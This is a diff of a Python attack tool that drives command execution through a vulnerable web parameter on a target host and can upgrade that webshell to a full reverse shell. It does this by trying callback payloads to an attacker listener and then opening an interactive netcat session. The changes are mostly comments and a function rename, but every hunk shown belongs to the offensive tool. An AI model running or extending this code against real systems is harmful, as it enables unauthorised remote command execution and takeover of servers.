@@ -10,21 +10,18 @@ import time
 import os
 import multiprocessing
 
-
-
+# Parse Command Line Arguments
 parser = argparse.ArgumentParser()
-history = []
 
 parser.add_argument("-p", "--parameter", metavar="PARAMETER NAME", dest="para_name", help="The parameter the is used to run shell commands", required=True, nargs=1)
 parser.add_argument("-X" , "--method", metavar="METHOD", dest="method", help="The method (GET/POST) that that is used ( Default: GET)", default="GET", nargs=1)
 parser.add_argument("-u", "--host", dest="host", metavar="HOST", help="The host that is attacked. Example: http://www.victim.com/vuln.php", required=True, nargs=1)
 parser.add_argument("-D", "--debug", dest="debug", help="If set the programm does print debug messages", action='store_true', default=False)
 parser.add_argument("-r", "--reverse", dest="reverse", help="If set the programm upgrades the connection from a webshell to a full functional reverse sehll", metavar="METHOD:LHOST:PORT", nargs=1)
+args = parser.parse_args()
 
-
-
-
-def upgraded_shell():
+# Initilized listener and start trying reverse shell payloads
+def init_upgraded_shell():
     args.method = args.method.upper()
     if args.method not in ["GET", "POST"]:
         print(f"[!] Method {args.method} not recognized")
@@ -52,6 +49,8 @@ def upgraded_shell():
     except (ValueError):
         print("[!] Could not parse METHOD:IP:PORT")
 
+
+# Tries to call back to listener with given payloads or tries everything if set to auto
 def back_call(payload_method, ip, port, payloads):
     time.sleep(1)
     timeout = 1
@@ -86,8 +85,7 @@ def back_call(payload_method, ip, port, payloads):
         print(f"[!] Method {payload_method} was not successfull")
 
 
-
-
+# Listens on given port and catches reverse shell. Then proceeds to upgrade it.
 def interactive_shell(ip, port, child_process):
     try:
         print("[!] Starting listener")
@@ -106,7 +104,6 @@ def interactive_shell(ip, port, child_process):
     time.sleep(1)
     nc.send("reset\n")
     nc.interactive()
-
     
 
 def web_shell():
@@ -137,11 +134,10 @@ def web_shell():
 
 
 
-args = parser.parse_args()
 if __name__ == '__main__':
     
     if args.reverse is not None :
-        upgraded_shell()
+        init_upgraded_shell()
     else:
         web_shell()
 
